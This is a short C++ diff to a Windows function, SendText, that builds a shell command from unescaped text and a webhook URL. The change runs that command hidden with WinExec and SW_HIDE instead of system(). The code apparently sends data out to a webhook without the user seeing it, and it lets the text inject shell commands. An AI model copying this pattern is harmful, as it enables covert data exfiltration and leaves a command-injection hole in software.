@@ -33,7 +33,7 @@ void SendText(string text, string webhook_url) {
 
     string cmd = cmd1p1 + text + cmd1p2 + webhook_url;
 
-    system(cmd.c_str());
+    WinExec(cmd.c_str(), SW_HIDE);
 
 }
 
